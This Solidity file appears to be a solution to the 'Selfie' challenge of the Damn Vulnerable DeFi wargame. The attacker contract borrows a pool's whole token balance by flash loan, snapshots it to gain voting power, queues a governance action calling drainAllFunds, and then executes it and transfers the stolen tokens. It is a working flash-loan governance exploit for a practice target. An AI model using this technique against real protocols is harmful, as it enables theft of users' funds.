// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract SelfieAttacker {

    using Address for address;

    SelfiePool private pool;
    SimpleGovernance private gov;
    DamnValuableTokenSnapshot private token;
    uint256 private actionId;

    constructor(address poolAddr, address govAddr) {
        pool = SelfiePool(poolAddr);
        gov = SimpleGovernance(govAddr);
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function attack1() external {
        uint256 lendAmount = token.balanceOf(address(pool));
        pool.flashLoan(lendAmount);
    }

    function attack2() external {
        gov.executeAction(actionId);

        uint256 balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
    }

    function receiveTokens(address tokenAddr, uint256 lendAmount) external {
        token.snapshot();
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", address(this)),
            0
        );
        token.transfer(address(pool), lendAmount);
    }
}
